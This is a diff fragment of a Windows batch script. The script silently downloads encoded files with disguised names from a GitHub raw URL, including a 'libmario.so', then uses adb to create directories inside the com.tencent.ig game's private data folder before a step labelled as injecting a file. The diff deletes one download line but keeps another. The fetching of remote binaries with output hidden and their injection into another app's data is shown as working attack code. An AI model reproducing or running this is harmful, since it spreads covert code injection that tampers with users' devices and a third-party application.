@@ -11,11 +11,11 @@ set "ENCODED_FILE1=%TEMP%\!RANDOM!!RANDOM!.enc"
 set "ENCODED_FILE2=%TEMP%\!RANDOM!!RANDOM!.enc"
 
 :: Download files with disguised names
-curl -s -o "!ENCODED_FILE1!" "https://raw.githubusercontent.com/Error111112/bn/refs/heads/main/ano_emu_c2.dat" >nul 2>&1
+
 curl -s -o "!ENCODED_FILE2!" "https://raw.githubusercontent.com/Error111112/bn/refs/heads/main/libmario.so" >nul 2>&1
 
 :: Create required directories silently
-adb shell mkdir -p /data/data/com.tencent.ig/files/ano_tmp >nul 2>&1
+
 adb shell mkdir -p /data/data/com.tencent.ig/lib >nul 2>&1
 
 :: Rename and inject the first file
